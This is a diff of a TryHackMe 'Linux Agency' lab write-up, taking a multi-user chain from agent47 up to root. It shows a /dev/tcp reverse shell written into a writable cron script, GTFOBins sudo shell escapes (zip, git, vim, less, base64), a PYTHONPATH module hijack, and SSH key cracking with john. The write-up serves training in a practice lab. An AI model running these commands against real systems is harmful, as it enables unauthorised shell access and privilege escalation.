@@ -3,167 +3,158 @@ Writeup for TryHackMe Linux Agency Lab - using find, grep, sudo, ssh, cron, GTFO
 
 By Ramyar Daneshgar 
 
-
-In this lab, I was tasked with completing a series of Linux fundamentals and privilege escalation exercises across multiple users, beginning with `agent47` and ending in root access. The format required me to log in via SSH, retrieve each user’s flag, and use that flag as the password to escalate to the next user account.
+This lab followed a structured, multi-user Linux escalation scenario requiring a combination of enumeration, file system inspection, encoding analysis, local privilege escalation (LPE) techniques, and abuse of misconfigured sudo rules. Starting from low-privileged access (`agent47`), I enumerated users and escalated through 30 chained accounts, culminating in root access. Each stage required deep familiarity with Linux internals, privilege boundaries, TTY manipulation, and controlled abuse of system-level tools and scripts.
 
 ---
 
-## Task 1: Initial Access as `agent47`
+## Initial Foothold: SSH Access as `agent47`
 
-I began by SSH’ing into the target machine:
+I authenticated via SSH:
 
 ```bash
 ssh agent47@10.10.188.218
 # Password: 640509040147
 ```
 
-Upon logging in, the system displayed that I must retrieve the flag for the next user (`mission1`). That flag would serve as the password for switching to the next user.
+The objective was clear: locate user-specific flags embedded across the file system using Linux primitives and use each flag as a credential to laterally move to the next user (`mission1` → `mission30`).
 
 ---
 
-## Task 2: Locating User Flags
+## User Enumeration Chain (`agent47` → `mission30`)
 
-I followed the format consistently for each mission user. To locate the flag, I used combinations of:
+### Recon and Local Enumeration
 
-- `find / -type f -name "flag.txt" 2>/dev/null`
-- `grep -r "missionX" / 2>/dev/null`
-- Searching hidden files: `grep -r missionX * .[^.]* 2>/dev/null`
+I used recursive search tools to locate flags via:
 
-### Example: `agent47` → `mission1`
+- `find / -type f -name "flag.txt" 2>/dev/null` — for plaintext flag files
+- `grep -r "missionX" / 2>/dev/null` — for hidden or embedded flag strings
+- `grep -r missionX * .[^.]* 2>/dev/null` — to uncover flags inside hidden dotfiles
+
+Example:
 
 ```bash
 grep -r mission1 * .[^.]* 2>/dev/null
 ```
 
-This revealed:
+Output:
 
 ```bash
 mission1{17********************f0}
 ```
 
-I then switched users:
+Followed by:
 
 ```bash
 su mission1
-# Password: mission1{17********************f0}
+# Password: mission1{...}
 ```
 
-I repeated this process through all `missionX` users (mission1 → mission30). Some flags were embedded in files (`flag.txt`), some hidden in binaries (ELF), and others encoded (base64, hex, binary).
+I repeated this for each mission user. In some cases, the flags were embedded in binaries (e.g., ELF executables), encoded in hex, base64, or obfuscated using XOR logic.
 
 ---
 
-## Selected Examples of Techniques Used
+## Highlighted Technical Scenarios
 
-### mission16 (Hex to ASCII)
+### Binary Decoding – Hex, Base64, XOR
 
-I found a hex string and used:
+- **Hex Decoding**:
+  ```bash
+  echo <hex_string> | xxd -r -p
+  ```
 
-```bash
-echo <hex> | xxd -r -p
-```
+- **XOR Deobfuscation**:
+  ```python
+  flag = "<xor_encoded_flag>"
+  for i in range(len(flag)):
+      flag = flag[:i] + chr(ord(flag[i]) ^ ord("S")) + flag[i+1:]
+      print(flag[i], end="")
+  ```
 
-To decode it into plain text.
+- **ELF Binary Inspection**:
+  ```bash
+  strings mission17.elf
+  chmod +x mission17.elf && ./mission17.elf
+  ```
 
----
-
-### mission17 (ELF Binary)
-
-When I saw the `ELF` header, I used `strings` and `chmod +x` with `./binary` to execute and analyze the binary:
-
-```bash
-strings mission17.elf
-./mission17.elf
-```
-
----
-
-### mission20 (XOR Obfuscation)
-
-The flag was obfuscated with XOR using `S`. I copied the encoded string to my machine and decoded it with Python:
-
-```python
-flag = ">:  :<=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."
-for i in range(len(flag)):
-    flag = (flag[:i] + chr(ord(flag[i]) ^ ord("S")) +flag[i + 1:])
-    print(flag[i], end = "")
-```
+These steps reinforced the need to recognize binary headers and know how to reverse basic encoding/obfuscation mechanisms in CTFs and malware analysis.
 
 ---
 
-### mission21 (TTY Shell)
+### TTY Shell Stabilization for Interactive Sessions
 
-I needed a proper TTY shell to improve interaction:
+To enhance shell usability for local LPE attempts, I chained together:
 
 ```bash
 script -qc /bin/bash /dev/null
-```
-
-This gave me a pseudo-interactive shell. I also ran:
-
-```bash
 export TERM=xterm
-```
-
-And then:
-
-```bash
 Ctrl + Z
 stty raw -echo; fg
 ```
 
-To enable full terminal features like tab-completion and arrow keys.
+This gave me access to line editing, tab completion, and process control—critical when working inside constrained shells.
 
 ---
 
-## Task 4: Privilege Escalation
+## Privilege Escalation Techniques (Post-mission30)
 
-After `mission30`, I began escalating privileges using various techniques. Below are key privilege escalation stages.
+### Cronjob Injection – `dalia`
 
----
-
-### dalia – Cronjob Backdoor
-
-I checked `/etc/crontab` and saw a script (`47.sh`) running every minute. It was owned by me and world-writable.
-
-I replaced its contents with a reverse shell:
+Found a world-writable script (`47.sh`) executed via `crontab` every minute:
 
 ```bash
 echo 'bash -i >& /dev/tcp/10.2.12.26/4444 0>&1' > /path/to/47.sh
 nc -lvnp 4444
 ```
 
-Within 30 seconds, I had a reverse shell as `dalia`.
+The shell returned within 30 seconds. This demonstrated time-sensitive command injection into persistent root-owned automation.
 
 ---
 
-### silvio – GTFOBins (zip + sudo)
+### Sudo Misconfigurations + GTFOBins
 
-```bash
-TF=$(mktemp -u)
-sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
-```
+**Abused binaries permitted via `sudo` without password:**
 
-This leveraged the `-TT` flag in zip to spawn a shell as `silvio`.
+- **zip (silvio)**:
+  ```bash
+  TF=$(mktemp -u)
+  sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+  ```
+
+- **git + PAGER (reza)**:
+  ```bash
+  sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p
+  ```
+
+  Then spawned an interactive shell:
+  ```bash
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  ```
+
+- **vim (sean)**:
+  ```bash
+  sudo -u sean vim -c ':!/bin/sh'
+  ```
+
+- **less (ken)**:
+  ```bash
+  sudo -u ken less /etc/profile
+  ```
+
+  Then executed `!/bin/sh` within the pager.
+
+- **base64 (maya)**:
+  Encoded a payload and decoded it inline using:
+  ```bash
+  echo <base64 payload> | sudo -u maya base64 -d | bash
+  ```
+
+GTFOBins was essential in quickly identifying how each binary could be hijacked for shell escape under elevated permissions.
 
 ---
 
-### reza – GTFObins (git + PAGER)
+### Python Module Hijack – `jordan`
 
-```bash
-sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p
-```
-
-I followed up with:
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
----
-
-### jordan – Python PATH Hijack
-
-The script `/opt/scripts/Gun-Shop.py` tried importing a nonexistent `shop` module. I created a fake module:
+A misconfigured script (`/opt/scripts/Gun-Shop.py`) imported a nonexistent module. I created a malicious Python package:
 
 ```bash
 mkdir -p /tmp/shop
@@ -171,102 +162,78 @@ echo 'import os; os.system("/bin/bash")' > /tmp/shop/__init__.py
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
 ```
 
----
-
-### ken – GTFOBins (less)
-
-```bash
-sudo -u ken less /etc/profile
-```
-
-Inside `less`, I typed `!/bin/sh` to break out.
+This exploited an import path vulnerability to execute arbitrary code with `jordan`’s privileges.
 
 ---
 
-### sean – GTFOBins (vim)
+### SSH Private Key Cracking – `robert`
+
+I located a private key under `.ssh` and exfiltrated it:
 
 ```bash
-sudo -u sean vim -c ':!/bin/sh'
-```
-
-To improve the shell, I ran:
-
-```bash
-script -qc /bin/bash /dev/null
-```
-
----
-
-### maya – GTFOBins (base64)
-
-I encoded a reverse shell script using base64 and used the GTFOBins sudo privilege to decode and execute it.
-
----
-
-### robert – SSH Private Key Cracking
-
-I found a `.ssh` folder with `id_rsa`. I copied it:
-
-```bash
-scp agent47@10.10.188.218:/home/robert/.ssh/id_rsa .
-```
-
-Then ran:
-
-```bash
+scp agent47@<ip>:/home/robert/.ssh/id_rsa .
 ssh2john id_rsa > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+Brute-forced the passphrase using John the Ripper. Gained shell access upon successful crack.
+
 ---
 
-### Final Stage – Root Access
+### Service Enumeration → Root via Bash Sudo
 
-I noticed an SSH service on port 2222 using:
+Discovered an SSH service on port `2222`:
 
 ```bash
 ss -tulpn
 ```
 
-I attempted to SSH to this port with cracked credentials.
-
-Then, using:
+After connecting and authenticating with a cracked credential, I checked sudo rights:
 
 ```bash
 sudo -l
 ```
 
-I found a bash binary allowed with sudo.
-
-Using:
+Root access was trivially granted via:
 
 ```bash
 sudo bash
 ```
 
-I was root.
-
 ---
 
-### root.txt
-
-I ran:
+## Post-Exploitation: root.txt Retrieval
 
 ```bash
 cat /root/root.txt
 ```
 
-Challenge complete.
+Root compromise confirmed.
 
 ---
 
-## Lessons Learned
+## Lessons Learned (Technical Takeaways)
 
-1. **Enumeration Is Everything**: Each stage required careful use of `find`, `grep`, `strings`, and `sudo -l`. Deep system inspection is vital.
-2. **Shell Interaction Matters**: A better TTY shell significantly improves workflow, especially in CTF environments. I will always stabilize my shells early.
-3. **GTFOBins Is a Critical Tool**: Knowing how to exploit standard binaries with sudo access (zip, less, git, base64, etc.) proved essential.
-4. **Crontab and PATH Hijacking Are Practical Vectors**: Watching for writable scripts and importable Python modules led to multiple privilege escalations.
-5. **Binary Analysis Shouldn’t Be Overlooked**: Recognizing ELF and Java binaries and decoding XOR, base64, or hex strings were common throughout.
-6. **Post-Exploit Hygiene Is Key**: I frequently cleaned up my dropped payloads and temporary files to avoid detection in a real-world scenario.
-7. **Password Reuse Patterns Emerge**: Most passwords followed a flag format (`username{md5}`), which helped anticipate the next steps and brute-force attempts if necessary.
-8. **Timing Matters in Cron-Based Escalation**: I had a narrow window (30 seconds) to inject a reverse shell into a script. Timing precision is crucial in real-world cronjob exploits.
+1. **Systematic File and Process Enumeration is Non-Negotiable**  
+   Leveraged `find`, `grep`, and `strings` to discover flags, hidden binaries, and misconfigurations across user accounts.
+
+2. **Shell Handling and TTY Control are Foundational for Exploitation**  
+   Full terminal control via `stty`, `script`, and environment tuning proved essential for executing chained LPE techniques.
+
+3. **GTFOBins is a Weaponized Reference Source**  
+   Familiarity with binary-specific shell escapes under sudo context was indispensable across multiple user accounts.
+
+4. **Path Injection & Import Hijacking are Common but Powerful Vectors**  
+   Abusing `PYTHONPATH` with malicious modules allowed code execution under elevated users—a common real-world vulnerability in misconfigured development environments.
+
+5. **Binary Analysis Enhances Flag Extraction and Vulnerability Detection**  
+   Recognizing and decoding ELF binaries, XOR strings, and base64/hex content was critical in transitioning through users.
+
+6. **Cron and Timer-based Execution are Ideal LPE Triggers**  
+   Monitoring `/etc/crontab` and injecting into writable scripts timed for root execution gave elevated access with minimal effort.
+
+7. **Credential Reuse and Weak Private Keys are Always in Play**  
+   SSH key extraction and password cracking (via `ssh2john` + `john`) remain effective in lateral movement and escalation.
+
+8. **Sudo Misconfigurations Often Lead to Full Compromise**  
+   Minimal privileges (e.g., `sudo vim`, `sudo git`) must always be reviewed for escalation paths.
